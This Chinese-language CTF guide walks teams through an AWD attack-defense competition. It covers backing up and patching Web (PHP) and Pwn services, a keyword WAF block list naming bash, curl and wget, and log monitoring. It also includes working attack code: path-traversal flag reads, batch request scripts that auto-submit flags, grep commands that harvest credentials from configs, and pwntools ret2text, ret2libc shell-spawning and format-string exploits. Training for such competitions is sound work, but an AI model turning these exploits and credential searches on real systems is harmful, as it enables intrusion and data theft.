拿源码/环境 → 本地跑 → 审计漏洞 → 写 Break 拿 flag → 写 Fix 补丁 → 本地验证攻击失效且业务正常 → 提交平台 → 根据检测结果继续修。
```

**最关键的两个成果物：**

```plain
exp.py：证明你能打通，拿 Break 分
fix.patch：证明你能修掉，拿 Fix 分
```

# 2.AWD
下面按 **AWD 比赛现场实际流程** 讲：你拿到自己的靶机以后，Web 和 Pwn 分别怎么防、怎么打、怎么自动化拿分。

# **一、开局 0–10 分钟：所有方向都先做的事**
**你一进机器，别急着打别人，先保自己不掉分。**

## **1. 立刻备份服务**
**常见目录先打包：**

```bash
mkdir -p /backup

tar -czf /backup/www_$(date +%F_%H%M).tar.gz /var/www/html 2>/dev/null
tar -czf /backup/home_$(date +%F_%H%M).tar.gz /home 2>/dev/null
tar -czf /backup/opt_$(date +%F_%H%M).tar.gz /opt 2>/dev/null
```

**如果有数据库：**

```bash
mysqldump -uroot -p --all-databases > /backup/all.sql
```

**如果不知道密码，先看配置文件：**

```bash
grep -R "password\|passwd\|DB_PASS\|MYSQL" /var/www/html /opt /home 2>/dev/null
```

---

## **2. 看服务端口**
```bash
ss -lntup
ps aux
```

**你要快速知道：**

```plain
Web 服务在哪个端口？
Pwn 服务在哪个端口？
服务进程是谁启动的？
代码目录在哪里？
```

**例如：**

```bash
ss -lntup | grep -E "80|8080|9999|10000"
ps aux | grep -E "nginx|apache|php|python|node|java|xinetd|socat"
```

---

## **3. 查启动方式**
```bash
systemctl list-units --type=service | grep -Ei "nginx|apache|php|ctf|pwn|xinetd"
crontab -l
ls -al /etc/cron* /var/spool/cron 2>/dev/null
```

**看有没有异常脚本、定时任务、别人预留的东西。**

---

## **4. 先把自己的服务跑稳**
```bash
systemctl restart nginx
systemctl restart apache2
systemctl restart php-fpm
```

**Pwn 服务可能是：**

```bash
systemctl restart xinetd
```

**或者：**

```bash
ps aux | grep socat
```

**重启脚本可能在：**

```bash
/etc/xinetd.d/
/home/ctf/
/opt/
```

---

# **二、Web 方向：防守实际操作**
**Web 防守核心不是“讲漏洞”，而是这几件事：**

```plain
备份代码 → 找入口 → 找漏洞点 → 快速修补 → 保持服务可用 → 监控别人攻击 → 反推攻击脚本
```

---

## **1. 快速定位 Web 目录**
**常见位置：**

```bash
ls -al /var/www/html
ls -al /srv/www
ls -al /app
ls -al /opt
```

**如果不知道网站根目录，看 nginx/apache 配置：**

```bash
grep -R "root " /etc/nginx 2>/dev/null
grep -R "DocumentRoot" /etc/apache2 /etc/httpd 2>/dev/null
```

**PHP 项目常见重点文件：**

```bash
find /var/www/html -type f | grep -E "config|database|db|conn|upload|admin|api|login|index"
```

---

## **2. 找敏感配置**
```bash
grep -R "host\|user\|pass\|dbname\|secret\|key\|token" /var/www/html 2>/dev/null
```

**重点看：**

```plain
数据库账号密码
管理员账号密码
JWT secret
API key
Redis 密码
文件上传目录
反序列化入口
```

---

## **3. 找危险函数**
**PHP 项目重点搜这些：**

```bash
grep -R "eval\|assert\|system\|exec\|shell_exec\|passthru\|popen\|proc_open" /var/www/html 2>/dev/null
```

**文件包含：**

```bash
grep -R "include\|require\|file_get_contents\|fopen\|readfile" /var/www/html 2>/dev/null
```

**SQL 拼接：**

```bash
grep -R "SELECT\|INSERT\|UPDATE\|DELETE" /var/www/html 2>/dev/null
```

**上传：**

```bash
grep -R "\$_FILES\|move_uploaded_file" /var/www/html 2>/dev/null
```

**反序列化：**

```bash
grep -R "unserialize\|__wakeup\|__destruct\|__toString" /var/www/html 2>/dev/null
```

---

## **4. Web 快速修补方式**
### **4.1 SQL 注入临时修**
**如果看到这种：**

```php
$sql = "select * from users where id=".$_GET['id'];
```

**临时修：**

```php
$id = intval($_GET['id']);
$sql = "select * from users where id=".$id;
```

**如果是字符串：**

```php
$name = addslashes($_GET['name']);
```

**比赛里临时修优先级：**

```plain
先保服务不崩
再减少注入面
最后才考虑优雅写法
```

---

### **4.2 文件上传临时修**
**上传点要限制后缀：**

```php
$allow = ['jpg','png','gif','txt'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allow)) {
    die("bad file");
}
```

**再加一层：上传目录禁止执行 PHP。**

**Nginx 可加：**

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```

**Apache 可在 uploads 下放 **`**.htaccess**`**：**

```plain
php_flag engine off
```

**或者：**

```plain
RemoveHandler .php .phtml .php5
```

---

### **4.3 命令执行临时修**
**如果看到：**

```php
system($_GET['cmd']);
```

**比赛里直接删或者改死：**

```php
die("disabled");
```

**如果业务必须执行命令，就白名单：**

```php
$allow = ['status', 'list'];
$action = $_GET['action'] ?? '';

if (!in_array($action, $allow)) {
    die("bad action");
}
```

**不要用黑名单挡：**

```php
; | & ` $ ( )
```

**黑名单很容易绕。**

---

### **4.4 文件包含临时修**
**危险代码：**

```php
include $_GET['page'];
```

**临时修：**

```php
$allow = [
    'home' => 'home.php',
    'about' => 'about.php',
];

$page = $_GET['page'] ?? 'home';

if (!isset($allow[$page])) {
    die("bad page");
}

include $allow[$page];
```

---

### **4.5 反序列化临时修**
**危险代码：**

```php
unserialize($_POST['data']);
```

**如果可以直接禁：**

```php
die("disabled");
```

**如果必须用，改 JSON：**

```php
$data = json_decode($_POST['data'], true);
```

**或者至少限制类：**

```php
unserialize($_POST['data'], ['allowed_classes' => false]);
```

---

## **5. Web 上 WAF/过滤器**
**比赛里常见做法是在入口文件最前面加一个简单过滤器。**

**比如 **`**index.php**`** 顶部：**

```php
<?php
$payload = json_encode($_REQUEST) . file_get_contents("php://input");

$black = [
    'eval',
    'assert',
    'system',
    'shell_exec',
    'passthru',
    'base64_decode',
    '../',
    'php://',
    'file://',
    'flag',
    'cat ',
    'bash',
    'curl',
    'wget'
];

foreach ($black as $b) {
    if (stripos($payload, $b) !== false) {
        http_response_code(403);
        die("blocked");
    }
}
?>
```

**注意：这只是比赛里的临时防守，不是长期安全方案。**

---

## **6. Web 流量监控**
**看访问日志：**

```bash
tail -f /var/log/nginx/access.log
tail -f /var/log/nginx/error.log
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log
```

**提取可疑请求：**

```bash
grep -Ei "select|union|sleep|benchmark|load_file|into outfile|eval|assert|base64|flag|cat|/etc/passwd|php://|file://" /var/log/nginx/access.log
```

**看谁打你：**

```bash
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head
```

**看高频路径：**

```bash
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -30
```

---

## **7. Web 被打穿后的应急操作**
**先查最近改动：**

```bash
find /var/www/html -type f -mmin -30 -ls
```

**查可疑 PHP 木马：**

```bash
grep -R "eval\|assert\|base64_decode\|gzinflate\|str_rot13\|shell_exec\|system" /var/www/html 2>/dev/null
```

**查隐藏文件：**

```bash
find /var/www/html -name ".*" -type f -ls
```

**查上传目录：**

```bash
find /var/www/html -type f | grep -Ei "upload|cache|tmp|avatar"
```

**如果发现异常文件，先别直接删，先备份：**

```bash
mkdir -p /backup/suspect
cp suspicious.php /backup/suspect/
rm suspicious.php
```

---

## **8. Web 攻击实际操作**
**你的攻击目标是：**

```plain
找到对方同款漏洞 → 读 flag → 提交平台 → 自动循环
```

**因为 AWD 里大家初始服务通常一样，所以你修自己漏洞时，也是在找攻击别人的漏洞。**

### **8.1 先在自己机器复现漏洞**
**例如你发现自己有文件读取：**

```plain
/download.php?file=xxx
```

**你先本地试：**

```bash
curl "http://127.0.0.1/download.php?file=../../../../flag"
```

**能读到 flag，就把目标换成对方 IP。**

---

### **8.2 批量打对方 Web**
**假设队伍 IP 在 **`**targets.txt**`**：**

```plain
10.0.1.2
10.0.1.3
10.0.1.4
```

**攻击脚本示例：**

```python
import requests
import re
import time

targets = open("targets.txt").read().splitlines()

for ip in targets:
    url = f"http://{ip}/download.php?file=../../../../flag"
    try:
        r = requests.get(url, timeout=3)
        if "flag{" in r.text:
            flag = re.findall(r"flag\{.*?\}", r.text)[0]
            print(ip, flag)
    except Exception as e:
        pass
```

---

### **8.3 自动提交 flag**
**一般平台给你一个提交接口，例如：**

```plain
http://submit.example.com/api/submit?flag=xxx
```

**你把提交逻辑加进去：**

```python
import requests
import re

targets = open("targets.txt").read().splitlines()
submit_url = "http://submit.example.com/api/submit"

for ip in targets:
    try:
        r = requests.get(f"http://{ip}/download.php?file=../../../../flag", timeout=3)
        flags = re.findall(r"flag\{.*?\}", r.text)

        for flag in flags:
            s = requests.post(submit_url, data={"flag": flag}, timeout=3)
            print(ip, flag, s.text)

    except Exception:
        pass
```

---

# **三、Pwn 方向：防守实际操作**
**Pwn 防守比 Web 更偏向：**

```plain
拿到二进制 → 备份 → 运行确认 → checksec → 找输入点 → 找漏洞 → 打补丁 → 保持服务可用
```

---

## **1. 找 Pwn 服务**
```bash
ss -lntup
ps aux | grep -Ei "pwn|ctf|socat|xinetd"
```

**常见部署方式：**

```bash
/etc/xinetd.d/pwn
/home/ctf/pwn
/opt/pwn
```

**看 xinetd 配置：**

```bash
cat /etc/xinetd.d/*
```

**常见内容类似：**

```plain
server = /home/ctf/pwn
port = 9999
user = ctf
```

---

## **2. 备份二进制和 libc**
```bash
mkdir -p /backup/pwn
cp /home/ctf/pwn /backup/pwn/
ldd /home/ctf/pwn
```

**如果有 libc：**

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /backup/pwn/
```

---

## **3. 本地分析**
```bash
file ./pwn
checksec ./pwn
strings ./pwn | head
strings ./pwn | grep -Ei "flag|cat|sh|system|password"
```

**看保护：**

```plain
Canary 有没有
NX 有没有
PIE 有没有
RELRO 有没有
```

---

## **4. 运行服务测试**
```bash
./pwn
```

**或者连接端口：**

```bash
nc 127.0.0.1 9999
```

**看输入流程：**

```plain
输入名字？
输入长度？
菜单选项？
能不能重复输入？
有没有格式化字符串？
有没有溢出？
```

---

## **5. Pwn 防守：最常见补丁思路**
### **5.1 输入长度过滤**
**如果服务是通过脚本启动的，可以在外层加 wrapper。**

**例如原本 xinetd 直接跑：**

```plain
server = /home/ctf/pwn
```

**你可以改成：**

```plain
server = /home/ctf/wrapper.sh
```

`**wrapper.sh**`**：**

```bash
#!/bin/bash
timeout 5 /home/ctf/pwn
```

**加超时可以防止别人卡死服务。**

---

### **5.2 禁止异常超长输入**
**如果题目漏洞是明显栈溢出，比如输入 300 字节就崩，正常业务只需要 32 字节，可以写一个 Python 包装层。**

```python
#!/usr/bin/env python3
import subprocess
import sys
import select

p = subprocess.Popen(
    ["/home/ctf/pwn.real"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.DEVNULL
)

while True:
    data = sys.stdin.buffer.readline()

    if not data:
        break

    if len(data) > 80:
        sys.stdout.buffer.write(b"too long\n")
        sys.stdout.buffer.flush()
        break

    p.stdin.write(data)
    p.stdin.flush()

    out = p.stdout.readline()
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
```

**然后：**

```bash
mv /home/ctf/pwn /home/ctf/pwn.real
chmod +x /home/ctf/wrapper.py
```

**xinetd 指向：**

```plain
server = /home/ctf/wrapper.py
```

---

### **5.3 修格式化字符串**
**如果正常输入不应该包含 **`**%p %x %s %n**`**，可以 wrapper 里拦：**

```python
bad = [b"%p", b"%x", b"%s", b"%n", b"%hn", b"%hhn"]

if any(x in data for x in bad):
    print("bad input")
    break
```

---

### **5.4 二进制热补丁**
**如果你能确定危险函数，比如 **`**gets**`**，可以尝试 patch。**

**查符号：**

```bash
objdump -d ./pwn | grep -Ei "gets|system|strcpy|scanf|read"
```

**也可以：**

```bash
readelf -s ./pwn | grep -Ei "gets|system|strcpy"
```

**如果是动态链接，能看到危险函数，可以用 **`**patchelf**`**、**`**hexedit**`**、**`**pwntools**`** 修改。**

**简单思路：**

```plain
把危险函数调用改掉
把后门函数跳转改掉
把读取长度改小
把 system("/bin/sh") 改成 puts("disabled")
```

**用 pwntools 写 patch：**

```python
from pwn import *

elf = ELF("./pwn")

# 假设 0x401234 是要 patch 的位置
elf.write(0x401234, asm("nop") * 5)

elf.save("./pwn_patched")
```

**然后替换服务：**

```bash
cp ./pwn_patched /home/ctf/pwn
chmod +x /home/ctf/pwn
systemctl restart xinetd
```

---

## **6. Pwn 防守：服务稳定性检查**
**改完一定要测：**

```bash
nc 127.0.0.1 9999
```

**再看端口：**

```bash
ss -lntup | grep 9999
```

**看服务是否挂：**

```bash
journalctl -xe
tail -f /var/log/syslog
```

**如果是 xinetd：**

```bash
systemctl restart xinetd
systemctl status xinetd
```

---

# **四、Pwn 方向：攻击实际操作**
**Pwn 攻击就是：**

```plain
拿二进制 → 本地打通 exploit → 换远程 IP/端口 → 批量打 → 拿 flag → 提交
```

---

## **1. 把题目文件拉到本地**
**从自己机器上拿：**

```bash
scp ctf@your_ip:/home/ctf/pwn .
```

**如果有 libc：**

```bash
scp ctf@your_ip:/lib/x86_64-linux-gnu/libc.so.6 .
```

---

## **2. 本地分析**
```bash
checksec ./pwn
file ./pwn
strings ./pwn
```

**跑一下：**

```bash
./pwn
```

**动态调试：**

```bash
gdb ./pwn
```

**常用：**

```plain
checksec
run
cyclic 300
cyclic -l 崩溃位置
```

---

## **3. 常见 Pwn 攻击流程**
### **情况一：栈溢出 ret2text**
**如果程序里本来有后门函数，例如：**

```plain
backdoor()
win()
get_flag()
```

**查函数：**

```bash
objdump -d ./pwn | grep -Ei "win|backdoor|flag|system"
```

**写 exploit：**

```python
from pwn import *

context.arch = "amd64"

io = remote("10.0.1.2", 9999)

payload = b"A" * 72
payload += p64(0x401216)  # win 函数地址

io.sendline(payload)
io.interactive()
```

**如果直接输出 flag，就改成接收并提交。**

---

### **情况二：ret2libc**
**流程是：**

```plain
泄露 puts 地址
计算 libc 基址
计算 system 和 /bin/sh
第二次 ROP 执行 system("/bin/sh")
读取 flag
```

**模板：**

```python
from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

ip = "10.0.1.2"
port = 9999

io = remote(ip, port)

pop_rdi = 0x4012b3
ret = 0x40101a

payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

io.sendline(payload)

leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]

system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

payload = b"A" * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.sendline(payload)
io.sendline(b"cat flag")

print(io.recvall(timeout=2))
```

---

### **情况三：格式化字符串**
**先探偏移：**

```python
from pwn import *

for i in range(1, 30):
    io = remote("10.0.1.2", 9999)
    io.sendline(f"%{i}$p".encode())
    print(i, io.recvall(timeout=1))
    io.close()
```

**找到偏移后，如果能泄露栈、libc、canary，就再构造下一步。**

---

## **4. Pwn 批量攻击**
**当一个 IP 打通后，就批量跑所有队伍。**

`**targets.txt**`**：**

```plain
10.0.1.2
10.0.1.3
10.0.1.4
```

**攻击框架：**

```python
from pwn import *
import re
import requests

elf = ELF("./pwn")
libc = ELF("./libc.so.6")

submit_url = "http://submit.example.com/api/submit"

def attack(ip):
    try:
        io = remote(ip, 9999, timeout=3)

        payload = b"A" * 72
        payload += p64(0x401216)

        io.sendline(payload)
        data = io.recvall(timeout=2)

        flags = re.findall(rb"flag\{.*?\}", data)

        for flag in flags:
            flag = flag.decode()
            print(ip, flag)
            requests.post(submit_url, data={"flag": flag}, timeout=3)

        io.close()

    except Exception as e:
        pass

for ip in open("targets.txt"):
    attack(ip.strip())
```

---

# **五、Web 和 Pwn 的攻防节奏**
**AWD 不是“先学完再打”，而是现场并行：**

```plain
第一阶段：保服务
第二阶段：修自己漏洞
第三阶段：用自己漏洞打别人
第四阶段：自动化提交 flag
第五阶段：持续监控别人新攻击
```

**实际节奏可以这样：**

---

## **开局 10 分钟内**
**你要做完：**

```plain
1. 备份 Web / Pwn / 数据库
2. 确认服务端口
3. 确认 flag 路径
4. 确认 check 脚本会访问哪些功能
5. 找最明显漏洞
6. 先打一个最粗暴补丁
```

**Web：**

```bash
grep -R "eval\|system\|unserialize\|move_uploaded_file\|include\|SELECT" /var/www/html
```

**Pwn：**

```bash
checksec ./pwn
strings ./pwn | grep -Ei "flag|sh|system|win"
```

---

## **中期**
**你要做：**

```plain
1. 从日志里看别人怎么打你
2. 复现他们的 payload
3. 修自己
4. 改成攻击脚本打别人
5. 自动提交 flag
```

**Web 日志里看到别人打：**

```plain
/index.php?file=../../../../flag
```

**你马上试别人：**

```bash
curl "http://对方IP/index.php?file=../../../../flag"
```

**如果能拿 flag，写批量脚本。**

**Pwn 被打崩：**

```bash
dmesg | tail
journalctl -xe
```

**看是不是溢出、超长输入、格式化字符串。**

---

## **后期**
**你要做：**

```plain
1. 自动化循环攻击
2. 自动化服务自检
3. 自动重启挂掉的服务
4. 持续修补新洞
5. 防止误封 check 机
```

**服务自检脚本：**

```bash
#!/bin/bash

while true; do
    curl -m 3 http://127.0.0.1/ >/dev/null

    if [ $? -ne 0 ]; then
        systemctl restart nginx
        systemctl restart php-fpm
    fi

    nc -z 127.0.0.1 9999

    if [ $? -ne 0 ]; then
        systemctl restart xinetd
    fi

    sleep 10
done
```

---

# **六、Web 方向实战分工**
**Web 队员一般分三类操作。**

## **1. 审计手**
**负责看代码找洞：**

```bash
grep -R "eval\|assert\|system\|exec\|shell_exec" .
grep -R "unserialize" .
grep -R "move_uploaded_file" .
grep -R "include\|require" .
grep -R "SELECT\|UPDATE\|INSERT" .
```

**找到洞之后输出：**

```plain
漏洞路径
参数
利用方式
修复方式
能不能批量打别人
```

---

## **2. 防守手**
**负责改代码、重启服务、看日志：**

```bash
vim vulnerable.php
systemctl restart nginx
systemctl restart php-fpm
tail -f /var/log/nginx/access.log
```

**防守手要保证：**

```plain
服务不能挂
check 不能失败
漏洞被封住
不能误伤正常业务
```

---

## **3. 攻击手**
**负责写批量脚本：**

```plain
读取 targets.txt
循环请求漏洞点
提取 flag
提交 flag
记录成功失败
```

**最简单模板：**

```python
import requests
import re

targets = open("targets.txt").read().splitlines()
submit = "http://submit.example.com/api/submit"

for ip in targets:
    try:
        url = f"http://{ip}/vuln.php?file=../../../../flag"
        r = requests.get(url, timeout=3)

        for flag in re.findall(r"flag\{.*?\}", r.text):
            print(ip, flag)
            requests.post(submit, data={"flag": flag}, timeout=3)

    except:
        pass
```

---

# **七、Pwn 方向实战分工**
**Pwn 队员通常这样分。**

## **1. 逆向分析手**
**负责：**

```plain
checksec
找漏洞函数
算 offset
找 gadgets
确定攻击路线
```

**常用命令：**

```bash
checksec ./pwn
ROPgadget --binary ./pwn | grep "pop rdi"
objdump -d ./pwn
strings ./pwn
```

---

## **2. Exploit 手**
**负责写 pwntools：**

```python
from pwn import *

io = remote("目标IP", 端口)

payload = b"A" * offset
payload += p64(addr)

io.sendline(payload)
io.interactive()
```

**打通一个 IP 后，立刻改批量。**

---

## **3. Patch 手**
**负责保护己方服务：**

```plain
加 wrapper
限制输入长度
限制危险字符
patch 二进制
重启服务
检查可用性
```

---

# **八、AWD 里最重要的实际思路**
## **Web 的核心**
```plain
你在自己代码里找到的漏洞，就是你打别人的入口。
你在日志里看到别人打你的 payload，就是别人已经验证过的攻击方式。
```

**所以 Web 方向现场最常见循环是：**

```plain
审自己代码
修自己
拿同样漏洞打别人
看日志学习别人打法
继续修
继续打
```

---

## **Pwn 的核心**
```plain
你自己服务的二进制，通常和别人一样。
你本地打通 exploit，换 IP 就可以批量打。
你修补时不能把服务修坏，否则 check 扣分。
```

**所以 Pwn 方向现场最常见循环是：**

```plain
本地分析二进制
写 exploit
打自己测试
打别人拿 flag
写防守 wrapper 或 patch
持续检测服务
```

---

# **九、比赛现场最实用的总流程**
**你可以按这个顺序执行：**

```plain
1. 登录靶机
2. 备份 Web、Pwn、数据库
3. 查看端口和服务
4. 确认 flag 位置
5. 确认 Web 路由和 Pwn 端口
6. Web 搜危险函数
7. Pwn checksec + strings
8. 先修最高危漏洞
9. 测服务是否正常
10. 从日志看别人攻击
11. 复现攻击
12. 批量打别人
13. 自动提交 flag
14. 写服务自检脚本
15. 持续修补和攻击
```

**一句话总结：**

```plain
AWD 实际操作不是单纯“防守”或“攻击”，而是：
先保自己不掉分，再把自己机器上发现的漏洞变成打别人机器的脚本。
```

**Web 更偏：**

```plain
代码审计 + 日志分析 + 快速修补 + 批量 HTTP 攻击
```

**Pwn 更偏：**

```plain
二进制分析 + exploit 编写 + wrapper/patch 防守 + 批量远程打点
```
